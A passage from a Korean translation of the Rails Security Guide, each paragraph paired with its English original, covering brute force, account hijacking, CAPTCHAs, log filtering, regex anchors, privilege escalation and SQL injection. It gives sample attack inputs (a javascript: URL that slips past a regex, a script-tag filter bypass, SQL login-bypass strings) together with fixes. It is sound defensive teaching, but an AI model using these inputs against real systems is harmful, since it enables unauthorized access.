이와 같이 데이터베이스에서 첫번째 사용자를 찾았다면 로그인되도록 해 줍니다. 이에 대한 자세한 내용은 [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)에서 찾을 수 있습니다. _가끔식 플러그인들을 업데이트할 것을 권합니다_. 더우기 어플리케이션을 재검토하면 이와 같이 더 많은 문제점들을 찾을 수 있을 것입니다. [[[And thus it found the first user in the database, returned it and logged him in. You can find out more about it in [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.]]]

### [Brute-Forcing Accounts] 계정에 대한 무차별 공격

**[역자주석]** 무차별 공격(Brute forcing) : 사전적인 단어들로 구성된 아이디와 패스워드 리스트를 가지고 계속적으로 로그인을 시도하는 것.

NOTE: _계정에 대한 무차별 공격은 로그인 인증정보에 대한 시행착오 방식의 공격입니다. 따라서 보다 일반적인 에러 메시지를 보여 줌으로써 이러한 공격을 방지하고 때로는 CAPTCHA 입력을 요구할 수도 있습니다_. [[[_Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._]]]

웹어플리케이션에서 사용자 명단을 작성하는 것은, 대부분의 사람들이 대충 비밀번호를 작성하기 때문에, 각 사용자의 비밀번호에 대한 무차별 공격을 받을 수 있습니다. 대부분의 비밀번호는 사전의 단어와 번호를 조합해서 만들어 집니다. 사용자 명단과 사전을 이용하면 자동화된 프로그램에서 수분내에 정확한 비밀번호를 찾아낼 수 있게 됩니다. [[[A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.]]]

이와 같은 이유로, 대부분의 웹어플리케이션은, 둘 중에 하나가 정확치 않을 경우, "사용자 이름 또는 비밀번호가 틀립니다"와 같이 일반적인 에러 메시지를 표시하게 됩니다. "입력한 사용자 이름을 찾을 수 없습니다"와 같이 표시해 줄 경우, 공격자가 사용자 명단을 자동으로 컴파일하여 모드 찾을 수 있게 될 것입니다. [[[Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.]]]

그러나, 대부분의 웹어플리케이션 디자이너들이 게을리하는 것은 비밀번호 분실 페이지입니다. 때로는 이러한 페이지가 입력한 사용자 이름이나 이메일 주소를 찾았거나 찾지 못한 것을 확인해 주는 결과를 초래하게 됩니다. 이로 인해 공격자는 사용자 명단을 작성하여 계정에 대해서 무차별 공격을 할 수 있게 될 것입니다. [[[However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.]]]

이러한 공격을 줄이기 위해서는, _비밀번호 분실 페이지에 일반적인 에러 메시지를 보여주어야 합니다_. 더우기, 특정 IP 주소로부터 수차례의 로그인 실패가 있을 경우에는, CAPTCHA 를 입력하도록 할 수 있습니다. 그러나 주의할 것은, 자동화된 프로그램은 가끔식 IP 주소를 변경해가면서 공격을 할 수 있기 때문에 완전하게 방어하지는 못한다는 것입니다. 그러나, 이러한 조치는 공격자들에게는 장애물이 되는 것입니다. [[[In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.]]]

### [Account Hijacking] 계정 가로채기

많은 수의 웹어플리케이션에서 유저 계정을 쉽게 가로채기 할 수 있습니다. 왜 계정을 다르게, 좀 더 어렵게 만들지 못할까? [[[Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.]]]

#### [Passwords] 비밀번호

공격자가 특정 사용자의 세션 쿠키를 가로채서 웹어플리케이션을 공동으로 사용하는 상황을 가정해 보겠습니다. 비밀번호를 쉽게 변경할 수 있을 경우 공격자는 클릭만 몇차례 하는 것만으로 계정을 가로채게 될 것입니다. 또는 비밀번호 변경 폼이 CSRF에 취약할 경우, 공격자는 CSRF 공격을 할 수 있도록 작업해 놓은 IMG 태그가 삽입되어 있는 웹페이지로 사용자를 유도하여 사용자의 비밀번호를 변경하도록 할 수 있을 것입니다. 이에 대한 대처방법으로는, 물론, _비밀번호 변경 폼을 CSRF에 대해서 안전하게 만들어야 합니다_. 그리고 비밀번호 변경시에 이전의 비밀번호도 함께 입력하도록 해야 합니다. [[[Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.]]]

#### [E-Mail] 이메일

그러나, 공격자는 이메일 주소를 변경하여 해당 계정을 자기 것으로 만들 수도 있을 것입니다. 이와 같이 이메일 주소를 변경한 후에, 공격자는 비밀번호 분실 페이지로 이동해서 새로운 비밀번호가 공격자의 이메일 주소로 발송되도록 할 것입니다. 또한, 이에 대한 대처방법은, 이메일 주소를 변경시에 비밀번호를 입력하도록 해야 합니다. [[[However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.]]]

#### [Other] 기타

웹어플리케이션에 따라서, 유저의 계정을 가로채는 방법에는 여러가지가 있을 수 있습니다. 많은 경우에, CSRF와 XSS를 이용하면 이와 같은 작업을 하는데 도움을 받을 수 있습니다. [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)에서 CSRF 취약성을 예로 들 수 있습니다. 이와 같이 새로운 개념을 검증하기 위한 공격상황에서, 공격에 희생이 될 사용자는 공격자가 조정하는 웹사이트로 유인되었을 것입니다. 그리고 해당 사이트의 웹페이지에는, 결국은 사용자의 구글메일의 필터 설정을 변경하는 HTTP GET 요청을 하도록 작업을 해 놓은 IMG 태그를 삽입해 놓게 됩니다. 이렇게해서 공격을 받게된 사용자가 구글 메일로 로그인하면 공격자는 필터를 변경해서 모든 이메일을 공격자의 이메일 주소로 전달되도록 할 것입니다. 이것은 거의 이메일 계정 전체를 가로채는 것 만큼의 큰 피해를 주게 됩니다. 이에 대한 조치는, _어플리케이션 로직을 재검토해서 XSS와 CSRF에 취약한 부분을 모두 제거하는 것입니다._ [[[Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.]]]

### [CAPTCHAs] 캡챠

INFO: _캡챠란 반응이 컴퓨터에 의해서 만들어지지 않았다는 것을 알아보기 위한 일종의 질의-답변 테스트입니다. 사용자에게 일그러진 이미지의 문자를 보고 입력하도록 하여 자동화된 스팸 봇이 코멘트 폼을 작성하지 못하도록 할 때 종종 사용됩니다. 네거티브 캡챠라는 것은 사용자가 본인이 사람이라는 것을 입증하도록 하는 것이 아니라 자기(로봇)가 로봇이라는 것을 밝히도록 하는 것입니다._ [[[_A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that he is human, but reveal that a robot is a robot._]]]

그러나 스팸 로봇(봇) 뿐만 아니라 자동 로그인 봇들도 문제입니다. 인기있는 캡챠 API는 [reCAPTCHA](http://recaptcha.net/)인데 오래된 책에서 발췌한 단어들을 가지고 만든 두개의 일그러진 이미지를 보여 줍니다. 또한 이전의 캡챠가 했던 것과 같이 배경을 일그러지게하고 텍스트의 왜곡도를 높이는 대신, 꺽인 선을 추가해 줍니다. 왜내하면 이전의 캡챠는 이미 해커들에 의해서 뚫렸기 때문입니다. 추가로, 리캡챠라는 것을 이용하면 오래된 책들을 디지탈화하는 데 도움을 받을 수 있습니다. [ReCAPTCHA](https://github.com/ambethia/recaptcha/)는 또한 API와 동일한 이름을 가지는 레일스 플러그인을 가지고 있습니다. [[[But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is [reCAPTCHA](http://recaptcha.net/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.]]]

캡챠 API에서는 두개의 키를 제공해 주는데, 공개키와 개인키입니다. 이것들은 레일스 환경에 추가해 주어야 합니다. 그리고 나서 뷰에서 recaptcha_tags 메소드를 사용하고 있고 컨트롤러에서는 verify_recaptcha 메소드를 사용할 수 있게 됩니다. 유효성 검증이 실패할 경우 verify_recaptcha 는 false를 반환하게 됩니다. 캡챠의 문제는 성가시게 한다는 것입니다. 또한, 시력 장애가 있는 사용자는 몇몇 일그러진 캡챠를 읽기가 어려ㅃ다는 것입니다. 네거티브 캡챠는 사용자가 사람이라는 적을 입증하는 것이 아니라 스탬 로봇이 봇이라는 것을 밝히는 것입니다. [[[You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.]]]

대부분의 봇은 정말로 바보라서 그저 웹을 다니면서 찾게 되는 모든 폼의 필드에 값을 넣어 줍니다. 네거티브 캡챠는 이러한 특징을 이용해서 사람이 인식하지 못하도록 CSS나 자바스크립트를 이용하여 폼에 하나의 "honeypot" 필드를 포함합니다. [[[Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.]]]

아래에는 자바스크립트나 CSS를 이용하여 honeypot 필드를 숨기는 방법에 대한 몇가지를 소개합니다. [[[Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:]]]

* 필드를 페이지의 가시영역 밖으로 위치시킨다. [[[position the fields off of the visible area of the page]]]

* 엘리먼트를 매우 작게 만들거나 페이지의 배경색과 동일하게 색상을 조절을 한다. [[[make the elements very small or color them the same as the background of the page]]]

* 필드를 보이게 할 경우에는 사용에게 빈칸으로 남겨 두도록 알려 준다. [[[leave the fields displayed, but tell humans to leave them blank]]]

가장 간단한 네거티브 캡챠는 숨겨진 honeypot 필드 하나만 있는 경우입니다. 서버 측에서는, 해당 필드의 값을 체크하게 되는데, 텍스트 값이 있을 경우에는 봇임에 틀림없습니다. 이 경우에 해당 포스트를 무시하거나 수락하는 결과를 반환할 수 있지만, 해당 포스트는 데이터베이스에 저장되지 않을 것입니다. 이런 식으로 하면 봇이 만족하는 상태에서 계속해서 작업을 수행하게 될 것입니다. 그러나 역시 사용자들에게 불편감을 줄 수 있을 것입니다. [[[The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.]]]

Ned Batchelder의 [블로그 글](http://nedbatchelder.com/text/stopbots.html)을 보면 네거티브 캡챠에 대한 더 자세한 내용을 볼 수 있을 것입니다. [[[You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html):]]]

* 현재의 UTC 타임스탬프 값을 가지는 필드를 포함하고 서버에서 이를 체크한다. 그 시간이 과거로 오래전의 것이거나 미래의 시간일 경우에 그 폼은 유효하지 않게 됩니다. [[[Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.]]]

* 필드명을 무작위로 만든다. [[[Randomize the field names]]]

* 서밋 버튼을 포함해서, 모든 종류의 필드타입을 가지는 하나이상의 honeypot 필드를 포함한다. [[[Include more than one honeypot field of all types, including submission buttons]]]

이렇게 하면 자동 봇으로 부터만 보호를 받을 수 있고, 특정 대상을 겨냥한 봇은 막을 수 없다는 것을 주목해야 합니다. 그래서 _네거티브 캡챠는 로그인폼을 보호할 수 있는 좋은 대안이 되지 못할 수 있습니다._ [[[Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.]]]

### [Logging] 로깅

WARNING: _레일스가 로그 파일에 비밀번호를 남기지 못하도록 해야 합니다._ [[[_Tell Rails not to put passwords in the log files._]]]

디폴트 상태에서는, 레일스가 웹어플리케이션으로 들어오는 모든 요청을 로그로 남기도록 되어 있습니다. 그러나, 이러한 로그 파일은, 로그인 정보, 신용카드 번호 등과 같은 정보를 포함할 수 있기 때문에, 커다란 보안 문제를 야기시킬 수 있습니다. 따라서, 웹어플리케이션의 보안을 디자인할 때는 공격자가 웹서버를 접근할 수 있을 경우 발생하게 될 문제들을 고려해야만 합니다. 데이터베이스에서 보안키와 비밀번호를 암호화한다고 하더라도 로그파일에 clear text 형태로 보이게 된다면 무용지물이 되어 버립니다. 그러므로 어플리케이션 설정파일에 `config.filter_parameters` 옵션에 이 값들을 추가해 주어서 로그파일에 특정 요청 파라미터는 걸러지도록 할 수 있습니다. 이러한 파라미터는 로그상에서 [FILTERED]라고 표시될 것입니다. [[[By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.]]]

```ruby
config.filter_parameters << :password
```

### [Good Passwords] 안전한 비밀번호

INFO: _모든 비밀번호를 기억한다는 것은 어려운 일입니다. 그렇다고 비밀번호를 기록으로 남겨 두어서는 안되지만 기억하기 쉬운 문장 속의 각 단어들의 첫문자를 이용하면 편리합니다._ [[[_Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._]]]

보안 전문가인 Bruce Schneier는 <a href="#examples-from-the-underground">아래</a>에서 언급되는 MySpace 피싱 공격으로부터 34,000개의 사용자 이름과 비밀번호를 [분석](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html)했습니다. 분석결과에서 대부분의 비밀번호는 매우 쉽게 알 수 있었다고 했습니다. 가장 흔히 사용하는 비밀번호 20개는 아래와 같습니다. [[[Bruce Schneier, a security technologist, [has analyzed](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html) 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:]]]

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.

이러한 비밀번호의 4%만이 사전에 있는 단어들이고 대부분은 알파벳과 숫자의 조합으로 만들어 진 것들이라는 것은 흥미로운 것입니다. 그러나, 비밀번호를 알아내는 크래커 사전에는 요즈음 많이 사용하는 비밀번호를 상당수 포함하고 있고, 이를 근거로 가능한 모든 알파벳 숫자 조합을 만들어 냅니다. 공격자가 사용자 명을 알고 있을 경우 보안이 약한 비밀번호를 사용한다면 해당 계정은 쉽게 뚫리게 될 것입니다. [[[It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.]]]

따라서 좋은 비밀번호란 대소문자를 섞어서 아주 긴 알파벳숫자 조합을 이용해서 만든 것입니다. 그러나 이러한 비밀번호는 기억하기 매우 어렵기 때문에, _쉽게 기억할 수 있는 문장의 첫 문자들만_ 을 입력하는 것을 권장하고 있습니다. 예를 들어, "The quick brown fox jumps over the lazy dog" 문장을 이용하면 "Tqbfjotld"와 같은 비밀번호를 만들 수 있는 것입니다. 이것은 예에 불과하기 때문에 이와 같이 잘 알려진 문구들을 해커들의 사전에 등록되어 있기 때문에 사용해서는 안됩니다. [[[A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.]]]

### [Regular Expressions] 정규 표현식

INFO: _루비 정규 표현식에는 잘 알려진 문제가 있는데, **문자열** 의 시작과 끝을 \A와 \z 대신에, ^ 과 $로 구분한다는 것입니다._ [[[_A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._]]]

루비는 보통 언어와는 약간 다른 방식으로 특정 **문자열** 의 시작과 끝을 구분합니다. 이것은 다수의 루비와 레일스 책들 조차도 잘 못 사용하는 이유이기도 합니다. 그렇다면 이것이 보안상 어떤 문제점을 야기하게 될까요? URL을 입력하는 필드값에 대한 유효성 검증을 약하게 하기 위해서 아래와 같이 간단한 정규표현식을 사용한다고 가정해 보겠습니다. [[[Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:]]]

```ruby
  /^https?:\/\/[^\n]+$/i
```

이것은 어떤 언어에서는 제대로 작동할 수 있습니다. 그러나, _루비에서는 ^ 와 $ 는 각각 **라인** 시작과 라인 끝을 구분해 줍니다. 따라서 아래와 같은 URL은 문제없이 필터를 통과하게 됩니다._ [[[This may work fine in some languages. However, _in Ruby ^ and $ match the **line** beginning and line end_. And thus a URL like this passes the filter without problems:]]]

```
javascript:exploit_code();/*
http://hi.com
*/
```

이 URL은 정규표현식이 두번째 라인과 일치하기 때문에 필터를 통과하게 됩니다. 즉 나머지 코드는 관련이 없게 됩니다. 이제 아래와 같은 URL을 뷰가 있다고 상상해 봅시다. [[[This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:]]]

```ruby
  link_to "Homepage", @user.homepage
```

위의 링크는 방문자들에게 별 문제 없이 보이지만, 클릭하는 순간 "exploit_code" 자바스크립트 함수 또는 공격자가 제공하는 다른 자바스크립트를 실행하게 될 것입니다. [[[The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.]]]

위의 정규표현식을 제대로 동작하도록 하기 위해서는, 아래와 같이 ^ 와 $ 대신에 \A 와 \z 을 사용해야 합니다. [[[To fix the regular expression, \A and \z should be used instead of ^ and $, like so:]]]

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

이것은 종종 범하기 쉬운 실수이기 때문에, validates_format_of 와 같은 포맷 유효성 검증기는 정규표현식이 ^ 시작하거나 $ 로 끝나는 경우 예외를 발생하게 됩니다. 드문 경우이지만, \A 와 \z 대신에 ^ 와 $ 을 사용할 필요가 있을 때는 아래와 같이 :multiline 옵션을 true로 지정할 수 있습니다. [[[Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:]]]

```ruby
  # content should include a line "Meanwhile" anywhere in the string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

이것은 포맷 유효성 검증기를 사용할 때 가장 범하기 쉬운 실수에 대해서만 보호를 받도록 해준다는 것을 주의해야 합니다. 즉, 항상 기억해 두어야 할 것은 루비에서 ^ 와 $ 은 문자열이 아니라 **라인** 의 시작과 끝을 매칭시켜 준다는 것입니다. [[[Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.]]]

### [Privilege Escalation] 권한 상승

WARNING: _하나의 파라미터를 변경하는 것으로 사용자는 접근권한이 없어질 수 있습니다. 제 아무리 감추고 코드 판독을 애매하게 하더라도 모든 파라미터는 변경될 수 있다는 것을 기억해야 합니다._ [[[_Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._]]]

임의의 사용자 임의로 변경할 수 있는 대부분의 파라미터는, `http://www.domain.com/project/1`와 같이, id 파라미터이며 1 이 바로 id에 해당하는 것입니다. 이것은 컨트롤러에서 params 형태로 사용할 수 있을 것입니다. 대부분이 아래와 같이 코딩을 할 것입니다. [[[The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:]]]

```ruby
@project = Project.find(params[:id])
```

이것은 어떤 웹어플리케이션에서는 괜찮겠지만, 특정 사용자가 모든 프로젝트를 볼 수 있는 권한이 없다면 문제가 발생하게 됩니다. 즉, 해당 아이디의 정보에 대한 접근 권한이 없는 경우에도, 사용자가 id를 42로 변경하여 해당 정보를 볼 수 있게 된다는 것입니다. 따라서 이 경우에는,대신에, _사용자의 접근 권한을 쿼리해야 합니다._ [[[This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, _query the user's access rights, too_:]]]

```ruby
@project = @current_user.projects.find(params[:id])
```

웹어플리케이션에 따라서, 특정 사용자가 훨씬 많은 파라미터를 변경할 수 있을 것입니다. 경험에 따른 규칙에 따라, 어떠한 사용자 입력 데이터는, 보안상 입증될 때까지, 안전하지 않다는 것이고, 사용자가 변경할 수 있는 모든 파라미터는 조작될 수 있다는 것입니다. [[[Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.]]]

코드의 난독성과 자바스크립트를 이용한 보안처리를 함으로써 안전하다고 생각하는 우를 범해서는 안됩니다. 모질라 파이어폭스용 웹개발자용 툴바를 이용하면 폼 안의 숨겨진 모든 필드를 재검토하고 변경할 수 있게 해 줍니다. _자바스크립트를 이용하여 사용자 입력 데이터에 대한 유효성 검증을 할 수 있지만 공격자는 예상치 못한 값을 이용하여 악성 요청을 여전히 보낼 수 있게 됩니다._ 모질라 파이어폭스용 Live Http Headers 플러그인은 모든 요청에 대한 로그를 잡아내어 요청을 반복하고 변경할 수 있게 해 줍니다. 이것은 자바스크립트 유효성 검증을 우회하는 손쉬운 방법이 됩니다. 그리고 심지어 클라이언트 측 프록시를 이용하면 인터넷을 통한 어떠한 요청이나 반응을 가로챌 수 있게 됩니다. [[[Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.]]]

[Injection] 주입
---------

INFO: _주입이란 악성코드나 파라미터를 웹어플리케이션으로 삽입해서 보안이 유지된 상태에서도 해당 코드를 실행토록하는 공격형태입니다. 주입의 두드러진 예로는 XSS와 SQL 주입이 있습니다._ [[[_Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._]]]

주입은 다루기가 매우 힘든데, 동일한 코드나 파라미터가 어떤 경우에는 악성코드로써 작동하지만 또 다른 상황에서는 전혀 해를 끼치지 않을 수 있기 때문입니다. 그러한 상황으로는 스크립팅, 쿼리 또는 프로그래밍 언어, 쉘이나 루비/레일스 메소드를 들 수 있습니다. 여기서는 주입공격이 발생할 수 있는 모든 주요 상황을 다루도록 하겠습니다. 그러나 첫번째 섹션에서는 주입과 연관해서 소프트웨어 설계상의 결정사항들에 대해서 다룰 것입니다. [[[Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.]]]

### [Whitelists versus Blacklists] 화이트리스트 대 블랙리스트

NOTE: _중요한 내용을 보호할 때는 블랙리스트 보다는 화이트리스트가 더 낫습니다._ [[[_When sanitizing, protecting or verifying something, whitelists over blacklists._]]]

블랙리스트란 불량 이메일 주소, 비공개 액션 또는 불량 HTML 태그들의 목록이 될 수 있습니다. 이것은 선호되는 이메일 주소, 공개 액션, 선호되는 HTML 태그 등과 같은 목록을 나타내는 화이트리스트의 상반되는 개념입니다. 스탬 필터와 같이 때로는 화이트리스트를 만들 수 없는 상황에서도 가능한한 아래와 같은 화이트리스트 접근법을 이용해도록 해야 합니다. [[[A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:]]]

* except: [...] 대신에 only: [...] 옵션을 이용해서 before_action을 사용해야 합니다. 이렇게 해야 새로 추가한 액션에 대해서 별도의 추가작업을 잊지 않게 될 것입니다. [[[Use before_action only: [...] instead of except: [...]. This way you don't forget to turn it off for newly added actions.]]]

* XSS 를 방지하기 위해서 &lt;script&gt; 를 제거하는 대신에 &lt;strong&gt; 를 사용해야 합니다. 자세한 것은 아래를 보기 바랍니다. [[[Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.]]]

* 블랙리스트가 작성한 입력내용을 수정하려고 시도해서는 안됩니다. [[[Don't try to correct user input by blacklists:]]]

* 이와 같은 조치로 인하여 공격이 작동하게 될 것입니다. "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "") [[[This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")]]]

* 그러나 잘 못된 입력내용은 거절해야 합니다. [[[But reject malformed input]]]

화이트리스트는, 블랙리스트 상에 중요한 항목을 빠뜨릴 수 있는 사람의 실수를 방지하기 위한 좋은 접근방법이 되기도 합니다. [[[Whitelists are also a good approach against the human factor of forgetting something in the blacklist.]]]

### [SQL Injection] SQL 주입

INFO: _영리한 메소드 덕분에, 이것은 대부분의 레일스 어플리케이션에서 거의 문제가 되지 않습니다. 그러나, 이것은 웹어플리케이션에서 매우 치명적이고 일반적인 공격방법이기 때문에 자세히 알아둘 필요가 있습니다._ [[[_Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._]]]

#### [Introduction] 개요

SQL 주입은 웹어플리케이션 파라미터를 조작하여 데이터베이스 쿼리에 영향을 미치도록 하는 것을 공격목표로 합니다. SQL 주입의 일반적인 공격목표는 권한체크를 우회하는 것입니다. 다른 목표는 데이터를 조작하거나 임의의 데이터를 읽어 들이는 것입니다. 아래에는 쿼리상에 사용자 입력 데이터를 사용하지 않는 방법에 대한 예를 보여 줍니다. [[[SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:]]]

```ruby
Project.where("name = '#{params[:name]}'")
```

이것은 검색 액션에서 필요할 수 있는데, 사용자는 찾기를 원하는 특정 프로젝트의 이름을 입력하게 됩니다. 악성 사용자가 ' OR 1 --' 와 같이 입력한다면 SQL결과는 다음과 같을 것입니다. [[[This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:]]]

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

두개의 대쉬(--)는 이후의 모든 내용을 무시하는 코멘트의 시작을 표시하는 것입니다. 따라서 이 쿼리는 사용자들이 볼 수 없는 프로젝트 테이블의 모든 레코드를 반환하게 됩니다. 조건이 모든 레코드에 대해서 true 상태이기 때문입니다. [[[The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.]]]

#### [Bypassing Authorization] 권한 우회하기

대개 웹어플리케이션은 접근 제한을 포함합니다. 사용자는 자신의 로그인 정보를 입력하고 웹어플리케이션은 사용자 테이블에서 일치하는 레코드를 검색하게 됩니다. 어플리케이션은 해당 레코드를 찾게될 경우 접근을 승인하게 됩니다. 그러나, 공격자는 SQL 주입을 이용하여 이러한 접급권을 우회할 수 있습니다. 아래에는, 사용자가 입력한 로그인 정보와 일치하는 첫번째 레코드를 사용자 테이블에서 찾기위해 레일스에서 수행하는 전형적인 데이터베이스 쿼리를 보여 줍니다. [[[Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.]]]

```ruby
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

공격자가 name으로 ' OR '1'='1 을 password로 ' OR '2'>'1 을 입력할 때 SQL 쿼리 결과는 다음과 같을 것입니다. [[[If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:]]]

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

이것은 데이터베이스에서 첫번째 레코드를 찾아서 해당 사용자에게 접근 승인을 하게 됩니다. [[[This will simply find the first record in the database, and grants access to this user.]]]

